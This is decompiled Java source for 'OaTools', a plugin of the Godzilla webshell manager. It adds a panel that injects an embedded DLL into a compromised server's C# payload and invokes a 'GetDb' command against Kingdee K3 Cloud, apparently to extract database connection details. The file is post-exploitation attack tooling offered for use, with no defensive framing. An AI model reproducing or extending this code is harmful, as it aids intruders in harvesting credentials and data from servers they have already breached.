package shells.plugins.csharp;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.Dimension;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.io.InputStream;
import java.util.Objects;
import javax.swing.Icon;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName = "CSharpDynamicPayload", Name = "OaTools", DisplayName = "OaTools")
/* loaded from: Godzilla_TH-V_2.0.jar:shells/plugins/csharp/OaTools.class */
public class OaTools implements Plugin {
    private ShellEntity shellEntity;
    private Payload payload;
    private boolean Kingdeeloaded = false;
    private Encoding encoding;
    private JPanel corePanel;
    private JTabbedPane tabbedPane1;
    private JButton KingdeeGetDbButton;
    private JTextArea KingdeeresultTextArea;
    private JPanel KingdeeJPanel;

    private /* synthetic */ void $$$setupUI$$$() {
        JPanel jPanel = new JPanel();
        this.corePanel = jPanel;
        jPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1, false, false));
        JTabbedPane jTabbedPane = new JTabbedPane();
        this.tabbedPane1 = jTabbedPane;
        jPanel.add(jTabbedPane, new GridConstraints(0, 0, 1, 1, 0, 3, 3, 3, null, new Dimension(200, 200), null));
        JPanel jPanel2 = new JPanel();
        this.KingdeeJPanel = jPanel2;
        jPanel2.setLayout(new GridLayoutManager(2, 1, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("金蝶K3 CLOUD", (Icon) null, jPanel2, (String) null);
        RTextScrollPane rTextScrollPane = new RTextScrollPane();
        jPanel2.add(rTextScrollPane, new GridConstraints(1, 0, 1, 1, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea = new RTextArea();
        this.KingdeeresultTextArea = rTextArea;
        rTextScrollPane.setViewportView(rTextArea);
        JButton jButton = new JButton();
        this.KingdeeGetDbButton = jButton;
        jButton.setText("获取数据库");
        jPanel2.add(jButton, new GridConstraints(0, 0, 1, 1, 8, 2, 3, 0, null, null, null));
    }

    public /* synthetic */ JComponent $$$getRootComponent$$$() {
        return this.corePanel;
    }

    public OaTools() {
        $$$setupUI$$$();
    }

    @Override // core.imp.Plugin
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.encoding = shellEntity.getEncodingModule();
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override // core.imp.Plugin
    public JPanel getView() {
        return this.corePanel;
    }

    private void KingdeeGetDbButtonClick(ActionEvent actionEvent) throws IOException {
        if (Kingdeeyonload()) {
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("cmd", "GetDb");
            String result = this.encoding.Decoding(this.payload.evalFunc("Kingdee.Run", "run", reqParameter));
            this.KingdeeresultTextArea.append(result);
            return;
        }
        this.KingdeeresultTextArea.setText("plugin not loaded");
    }

    private boolean Kingdeeyonload() {
        if (!this.Kingdeeloaded) {
            this.Kingdeeloaded = this.payload.include("Kingdee.Run", functions.readInputStreamAutoClose((InputStream) Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/Kingdee.dll"))));
        }
        return this.Kingdeeloaded;
    }
}